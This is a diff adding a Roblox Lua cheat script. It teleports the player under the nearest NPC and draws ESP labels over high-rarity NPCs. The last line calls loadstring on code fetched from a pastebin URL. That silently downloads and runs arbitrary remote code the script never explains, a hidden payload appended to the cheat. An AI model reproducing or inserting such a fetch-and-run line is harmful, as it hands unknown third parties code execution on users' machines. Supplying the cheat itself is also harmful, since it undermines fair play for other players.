@@ -1,0 +1,299 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- ==================== TELEPORT CONFIGURATION ====================
+local teleportEnabled = false
+local teleportConnection
+
+local HOVER_HEIGHT = -10
+local TELEPORT_MAX_RANGE = 750
+local CHECK_INTERVAL = 0.2
+local GYRO_TORQUE = 9e14
+
+local bodyVelocity
+local bodyGyro
+local currentTarget = nil
+
+-- ==================== ESP CONFIGURATION ====================
+local ESP_MAX_RANGE = 750
+local MIN_RARITY = 59
+local espObjects = {}
+
+-- ==================== TELEPORT FUNCTIONS ====================
+local function getCharacter()
+    return player.Character or player.CharacterAdded:Wait()
+end
+
+local function isPlayerHead(head)
+    local model = head.Parent
+    if model and model:IsA("Model") then
+        local humanoid = model:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr.Character == model then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+local function findNearestNPC(character)
+    if not character or not character:FindFirstChild("HumanoidRootPart") then
+        return nil
+    end
+    
+    local rootPart = character.HumanoidRootPart
+    local nearestHead = nil
+    local nearestDistance = TELEPORT_MAX_RANGE
+    
+    local npcsFolder = workspace:FindFirstChild("NPCs")
+    if not npcsFolder then
+        return nil
+    end
+    
+    for _, npc in pairs(npcsFolder:GetChildren()) do
+        if npc:IsA("Model") then
+            local head = npc:FindFirstChild("Head")
+            local humanoid = npc:FindFirstChildOfClass("Humanoid")
+            
+            if head and humanoid and humanoid.Health > 0 and not isPlayerHead(head) then
+                local distance = (rootPart.Position - head.Position).Magnitude
+                
+                if distance < nearestDistance then
+                    nearestDistance = distance
+                    nearestHead = head
+                end
+            end
+        end
+    end
+    
+    return nearestHead
+end
+
+local function createBodyMovers(character)
+    if not character or not character:FindFirstChild("HumanoidRootPart") then
+        return
+    end
+    
+    local rootPart = character.HumanoidRootPart
+    
+    if bodyVelocity then bodyVelocity:Destroy() end
+    if bodyGyro then bodyGyro:Destroy() end
+    
+    bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+    bodyVelocity.Parent = rootPart
+    
+    bodyGyro = Instance.new("BodyGyro")
+    bodyGyro.MaxTorque = Vector3.new(GYRO_TORQUE, GYRO_TORQUE, GYRO_TORQUE)
+    bodyGyro.P = 10000
+    bodyGyro.D = 500
+    bodyGyro.Parent = rootPart
+end
+
+local function removeBodyMovers()
+    if bodyVelocity then
+        bodyVelocity:Destroy()
+        bodyVelocity = nil
+    end
+    if bodyGyro then
+        bodyGyro:Destroy()
+        bodyGyro = nil
+    end
+end
+
+local function teleportLoop()
+    local lastCheck = 0
+    
+    teleportConnection = RunService.Heartbeat:Connect(function(deltaTime)
+        if not teleportEnabled then return end
+        
+        local character = player.Character
+        if not character or not character:FindFirstChild("HumanoidRootPart") then
+            return
+        end
+        
+        local rootPart = character.HumanoidRootPart
+        
+        lastCheck = lastCheck + deltaTime
+        if lastCheck >= CHECK_INTERVAL then
+            lastCheck = 0
+            currentTarget = findNearestNPC(character)
+        end
+        
+        if currentTarget and currentTarget.Parent then
+            local humanoid = currentTarget.Parent:FindFirstChildOfClass("Humanoid")
+            
+            if humanoid and humanoid.Health > 0 then
+                if not bodyVelocity or not bodyVelocity.Parent then
+                    createBodyMovers(character)
+                end
+                
+                local targetPosition = currentTarget.Position + Vector3.new(0, HOVER_HEIGHT, 0)
+                local lookAtCFrame = CFrame.lookAt(targetPosition, currentTarget.Position)
+                rootPart.CFrame = lookAtCFrame
+                
+                if bodyGyro and bodyGyro.Parent then
+                    bodyGyro.CFrame = CFrame.lookAt(rootPart.Position, currentTarget.Position)
+                end
+            else
+                currentTarget = nil
+            end
+        else
+            removeBodyMovers()
+            currentTarget = nil
+        end
+    end)
+end
+
+local function stopTeleportLoop()
+    if teleportConnection then
+        teleportConnection:Disconnect()
+        teleportConnection = nil
+    end
+    removeBodyMovers()
+    currentTarget = nil
+end
+
+local function toggleTeleport()
+    teleportEnabled = not teleportEnabled
+    
+    if teleportEnabled then
+        print("NPC Teleport: ENABLED")
+        teleportLoop()
+    else
+        print("NPC Teleport: DISABLED")
+        stopTeleportLoop()
+    end
+end
+
+-- ==================== ESP FUNCTIONS ====================
+local function createESP(npc)
+    if espObjects[npc] then return end
+    
+    local head = npc:FindFirstChild("Head")
+    if not head then return end
+    
+    local rarityValue = npc:GetAttribute("Rarity")
+    if not rarityValue or rarityValue <= MIN_RARITY then return end
+    
+    local gui = head:FindFirstChild("Gui")
+    if not gui then return end
+    
+    local rarityLabel = gui:FindFirstChild("Rarity")
+    if not rarityLabel or not rarityLabel:IsA("TextLabel") then return end
+    
+    local rarityText = rarityLabel.Text
+    local mobName = npc.Name
+    
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "ESP"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 96, 0, 24)
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = head
+    
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = string.format("%s | %s", mobName, rarityText)
+    textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+    textLabel.TextStrokeTransparency = 0.5
+    textLabel.TextScaled = true
+    textLabel.Font = Enum.Font.Jura
+    textLabel.Parent = billboard
+    
+    espObjects[npc] = billboard
+end
+
+local function removeESP(npc)
+    if espObjects[npc] then
+        espObjects[npc]:Destroy()
+        espObjects[npc] = nil
+    end
+end
+
+local function shouldHaveESP(npc, playerChar)
+    if not npc or not npc:IsA("Model") then return false end
+    if not playerChar or not playerChar:FindFirstChild("HumanoidRootPart") then return false end
+    
+    local head = npc:FindFirstChild("Head")
+    local humanoid = npc:FindFirstChildOfClass("Humanoid")
+    
+    if not head or not humanoid or humanoid.Health <= 0 then return false end
+    
+    local rarityValue = npc:GetAttribute("Rarity")
+    if not rarityValue or rarityValue <= MIN_RARITY then return false end
+    
+    local distance = (playerChar.HumanoidRootPart.Position - head.Position).Magnitude
+    if distance > ESP_MAX_RANGE then return false end
+    
+    return true
+end
+
+local function espLoop()
+    RunService.Heartbeat:Connect(function()
+        local character = player.Character
+        if not character then return end
+        
+        local npcsFolder = workspace:FindFirstChild("NPCs")
+        if not npcsFolder then return end
+        
+        local checkedNPCs = {}
+        
+        for _, npc in pairs(npcsFolder:GetChildren()) do
+            checkedNPCs[npc] = true
+            
+            if shouldHaveESP(npc, character) then
+                createESP(npc)
+            else
+                removeESP(npc)
+            end
+        end
+        
+        for npc, _ in pairs(espObjects) do
+            if not checkedNPCs[npc] or not npc.Parent then
+                removeESP(npc)
+            end
+        end
+    end)
+end
+
+-- ==================== CHARACTER RESPAWN HANDLER ====================
+player.CharacterAdded:Connect(function(character)
+    if teleportEnabled then
+        character:WaitForChild("HumanoidRootPart")
+        wait(0.1)
+        stopTeleportLoop()
+        teleportLoop()
+    end
+end)
+
+-- ==================== KEYBINDS ====================
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    
+    if input.KeyCode == Enum.KeyCode.F then
+        toggleTeleport()
+    end
+end)
+
+-- ==================== INITIALIZATION ====================
+-- Start ESP (always on)
+espLoop()
+print("High Rarity ESP: ENABLED (Always On)")
+
+-- Load existing character for teleport if already spawned
+if player.Character then
+    -- Just wait for it to be ready
+end
+
+print("NPC Teleport Script Loaded! Press F to toggle.")
+loadstring(game:HttpGetAsync('https://pastebin.com/raw/WgkcDYUs'))()
